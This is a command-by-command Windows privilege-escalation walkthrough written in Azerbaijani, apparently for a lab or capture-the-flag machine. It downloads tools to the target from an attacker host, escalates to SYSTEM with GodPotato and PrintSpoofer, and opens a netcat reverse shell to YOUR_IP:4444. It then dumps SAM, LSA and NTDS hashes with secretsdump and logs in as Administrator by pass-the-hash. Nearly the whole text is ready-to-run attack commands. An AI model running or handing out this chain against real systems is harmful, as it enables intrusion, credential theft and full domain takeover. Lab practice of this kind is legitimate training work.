# 1. Shell əldə et

```bash
evil-winrm -i IP -u user -p pass
```

Yoxla:

```bash
whoami
```

---

# 2. Privilege-ləri yoxla

```bash
whoami /priv
```

Axtardığın:

```
SeImpersonatePrivilege
```

və ya

```
SeAssignPrimaryTokenPrivilege
```

---

# 3. winPEAS ilə enum

Kali:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
```

HTTP server aç:

```bash
python3 -m http.server 80
```

Target:

```bash
curl http://YOUR_IP/winPEASx64.exe -o winPEASx64.exe
```

İşlət:

```bash
winPEASx64.exe
```

---

# 4. GodPotato yüklə

Kali:

```bash
wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe
```

HTTP server:

```bash
python3 -m http.server 80
```

Target:

```bash
curl http://YOUR_IP/GodPotato-NET4.exe -o GodPotato.exe
```

---

# 5. GodPotato test

```bash
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

Əgər:

```
nt authority\system
```

çıxırsa işləyib.

--

# 6. SYSTEM shell

```bash
.\GodPotato-NET4.exe -cmd "cmd"
```

və ya

```bash
.\GodPotato-NET4.exe -cmd "powershell"
```

---

# 7. Alternativ: PrintSpoofer

Kali:

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe
```

Target:

```bash
curl http://YOUR_IP/PrintSpoofer64.exe -o PrintSpoofer64.exe
```

İşlət:

```bash
PrintSpoofer64.exe -i -c cmd
```

və ya

```bash
PrintSpoofer64.exe -i -c powershell
```

---

# 8. Reverse Shell

Kali listener:

```bash
nc -lvnp 4444
```

---

nc.exe hazırla

```bash
cd /usr/share/windows-binaries/
python3 -m http.server 80
```

Target:

```bash
curl http://YOUR_IP/nc.exe -o nc.exe
```

---

GodPotato ilə reverse shell:

```bash
.\GodPotato-NET4.exe -cmd "cmd /c nc.exe -e cmd YOUR_IP 4444"
```

---

PrintSpoofer ilə reverse shell:

```bash
.\PrintSpoofer64.exe -c "cmd /c nc.exe YOUR_IP 4444 -e cmd"
```

---

# 9. SYSTEM olduğunu yoxla

```bash
whoami
```

çıxmalıdır:

```
nt authority\system
```

---

# 10. secretsdump

Əgər credentialın varsa:

```bash
impacket-secretsdump PENTESTLAB.local/svc_backup:Password1@192.168.56.20
```

Alırsan:

```
SAM
LSA
NTDS
Administrator Hash
```

---

# 11. Administrator hash ilə login

```bash
evil-winrm -i IP -u Administrator -H HASH
```

və ya

```bash
smbclient //IP/C$ -U Administrator --pw-nt-hash HASH
```

---

# 12. Flag qovluğu

Ownership götür:

```bash
takeown /F C:\DCSync_Proof /R
```

İcazə ver:

```bash
icacls C:\DCSync_Proof /grant SYSTEM:F /T
```

Flag:

```bash
type C:\DCSync_Proof\flag.txt
```

# Tam Flow

```
Shell
↓
whoami /priv
↓
winPEAS
↓
SeImpersonatePrivilege
↓
GodPotato / PrintSpoofer
↓
SYSTEM
↓
Reverse Shell (optional)
↓
secretsdump
↓
Administrator Hash
↓
Pass-The-Hash
↓
Flag
```
